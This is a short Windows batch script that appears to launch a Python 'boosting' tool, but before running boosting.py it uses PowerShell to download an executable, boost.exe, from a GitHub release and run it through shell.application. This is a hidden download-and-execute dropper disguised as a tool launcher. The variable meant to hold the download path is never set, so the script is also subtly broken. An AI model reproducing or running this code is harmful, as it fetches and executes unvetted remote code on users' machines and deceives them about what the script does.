@echo off
cd Tuto
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
py boosting.py
